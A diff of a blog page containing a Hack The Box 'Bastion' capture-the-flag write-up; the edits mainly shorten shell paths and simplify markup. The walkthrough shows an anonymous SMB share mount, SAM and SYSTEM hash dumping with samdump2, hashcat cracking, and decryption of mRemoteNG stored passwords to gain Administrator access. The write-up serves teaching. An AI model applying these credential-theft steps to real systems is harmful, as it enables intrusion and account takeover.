@@ -90,7 +90,7 @@
 
       <div class="read-time">
         <small>
-          7 minute read
+          6 minute read
         </small>
       </div>
 
@@ -102,7 +102,7 @@
 
 <h1 id="initial-scan">Initial Scan</h1>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
 Nmap scan report for 10.10.10.134
 Host is up (0.053s latency).
@@ -147,7 +147,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds</code></pre></figur
 
 <p>It’s always worth testing to see if SMB permits null (aka anonymous) sessions. <strong>We need a share</strong> to try authenticating to first. So we list out the shares.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# smbclient -L \\10.10.10.134
 Enter WORKGROUP\root's password:
     Sharename       Type      Comment                                                                                           
     ---------       ----      -------                                                                                           
@@ -157,9 +157,9 @@ Enter WORKGROUP\root's password:
     IPC$            IPC       Remote IPC 
     </code></pre></figure>
 
-<p><code class="highlighter-rouge">ADMIN$</code>, <code class="highlighter-rouge">C$</code>, and <code class="highlighter-rouge">IPC$</code> are all default shares. <code class="highlighter-rouge">Backups</code> is the only one that stands out. I attempt to authenticate to it with no credentials.</p>
+<p><code>ADMIN$</code>, <code>C$</code>, and <code>IPC$</code> are all default shares. <code>Backups</code> is the only one that stands out. I attempt to authenticate to it with no credentials.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# smbclient \\\\10.10.10.134\\Backups
 Enter WORKGROUP\root's password:
 Try "help" to get a list of possible commands.
 smb: \&gt; dir
@@ -171,9 +171,9 @@ smb: \&gt; dir
 
                 7735807 blocks of size 4096. 2745314 blocks available</code></pre></figure>
 
-<p>Our null session worked. We have read access to the <code class="highlighter-rouge">Backups</code> share.</p>
+<p>Our null session worked. We have read access to the <code>Backups</code> share.</p>
 
-<p>Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory <code class="highlighter-rouge">WindowsImageBackup</code>.</p>
+<p>Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory <code>WindowsImageBackup</code>.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&gt; dir
   .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
@@ -184,28 +184,28 @@ smb: \&gt; dir
                                                             
   &lt; . . . snip . . . &gt;</code></pre></figure>
 
-<p>VHD files? Definitely something to look at. But <code class="highlighter-rouge">5418299392</code> blocks? That’s over <em>two terabytes</em>. We need a way to enumerate the VHDs without downloading them entirely.</p>
+<p>VHD files? Definitely something to look at. But <code>5418299392</code> blocks? That’s over <em>two terabytes</em>. We need a way to enumerate the VHDs without downloading them entirely.</p>
 
 <h1 id="mounting-shares-and-vhd-files">Mounting shares and VHD files</h1>
 
 <p>If we mount the share, we can view it as if it were part of our own file system.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
 Password for anonymous@//10.10.10.134/Backups:  </code></pre></figure>
 
 <p><img src="/images/bastion/image2.png" alt="" /></p>
 
-<p>Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install <code class="highlighter-rouge">guestmount</code>.</p>
+<p>Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install <code>guestmount</code>.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# apt-get install libguestfs-tools</code></pre></figure>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# apt-get install libguestfs-tools</code></pre></figure>
 
 <p>Then we create a new directory as the mountpoint.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# mkdir vhd1</code></pre></figure>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# mkdir vhd1</code></pre></figure>
 
 <p>And we mount the VHD file.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# guestmount --add "/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/HTB/Bastion/vhd1 -v</code></pre></figure>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# guestmount --add "/root/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/vhd1 -v</code></pre></figure>
 
 <p>Now we can browse through the file system as if it were part of our own.</p>
 
@@ -213,15 +213,15 @@ Password for anonymous@//10.10.10.134/Backups:  </code></pre></figure>
 
 <p><em>Note: One of the VHD files wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.</em></p>
 
-<p>Now with read access to the VHD, my first instinct is to go for the <strong>flags</strong>, but there’s nothing at <code class="highlighter-rouge">C:\Users\L4mpje\Desktop</code> or <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code>. So we clearly don’t have the right access just yet.</p>
+<p>Now with read access to the VHD, my first instinct is to go for the <strong>flags</strong>, but there’s nothing at <code>C:\Users\L4mpje\Desktop</code> or <code>C:\Users\Administrator\Desktop</code>. So we clearly don’t have the right access just yet.</p>
 
 <p>Next thing to do would be to search for <strong>user credentials</strong> (remember the open SSH port?). After we’ve checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.</p>
 
 <h1 id="sam-and-security">SAM and SECURITY</h1>
 
-<p>Depending on your version of Windows, these can be in a few different locations. Here, they’re in <code class="highlighter-rouge">C:\Windows\System32\config</code>.</p>
+<p>Depending on your version of Windows, these can be in a few different locations. Here, they’re in <code>C:\Windows\System32\config</code>.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/vhd1/Windows/System32/config# dir
 &lt; . . . snip . . . &gt;
 SAM
 SAM.LOG
@@ -232,26 +232,26 @@ SECURITY
 
 <p>I copy them from the mounted drive to my Kali box.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
-root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion</code></pre></figure>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/vhd1/Windows/System32/config# cp SAM ~
+root@kali:~/vhd1/Windows/System32/config# cp SYSTEM ~</code></pre></figure>
 
-<p>To get the hashes, I use <code class="highlighter-rouge">samdump2</code> and pass the <code class="highlighter-rouge">SYSTEM</code> and <code class="highlighter-rouge">SAM</code> files as arguments.</p>
+<p>To get the hashes, I use <code>samdump2</code> and pass the <code>SYSTEM</code> and <code>SAM</code> files as arguments.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
-root@kali:~/HTB/Bastion# cat hashes.txt
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# samdump2 SYSTEM SAM -o hashes.txt
+root@kali:~# cat hashes.txt
 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</code></pre></figure>
 
-<p>The L4mpje hash takes seconds to crack with <code class="highlighter-rouge">hashcat</code>.</p>
+<p>The L4mpje hash takes seconds to crack with <code>hashcat</code>.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force</code></pre></figure>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force</code></pre></figure>
 
-<p>The password for use L4mpje is <strong>bureaulampje</strong>. The Administrator and Guest account hashes are marked as <code class="highlighter-rouge">*disabled*</code>, so this is the best we’ll get.</p>
+<p>The password for use L4mpje is <strong>bureaulampje</strong>. The Administrator and Guest account hashes are marked as <code>*disabled*</code>, so this is the best we’ll get.</p>
 
 <p><img src="/images/bastion/image4.png" alt="" /></p>
 
-<p>To get in, we <code class="highlighter-rouge">ssh</code> as <strong>L4mpje@10.10.10.134</strong> with the recovered password.</p>
+<p>To get in, we <code>ssh</code> as <strong>L4mpje@10.10.10.134</strong> with the recovered password.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# ssh L4mpje@10.10.10.134
 L4mpje@10.10.10.134's password: 
@@ -268,7 +268,7 @@ l4mpje@BASTION C:\Users\L4mpje&gt;    </code></pre></figure>
 
 <h1 id="privilege-escalation-mremoteng-credentials">Privilege Escalation: mRemoteNG Credentials</h1>
 
-<p>With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, <code class="highlighter-rouge">mRemoteNG</code> stands out.</p>
+<p>With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, <code>mRemoteNG</code> stands out.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">l4mpje@BASTION C:\&gt;dir "Program Files (x86)"                                    
  Volume in drive C has no label.                                                
@@ -309,7 +309,7 @@ l4mpje@BASTION C:\Users\L4mpje&gt;    </code></pre></figure>
 
 <p>What worked best for me was <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG_Decrypt.py</a>. I copied the encrypted password and passed it as a string to get the plaintext credential.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Password: thXLHM96BeKL0ER2</code></pre></figure>
 
 <p>From here, we simply have to SSH in as Administrator.</p>
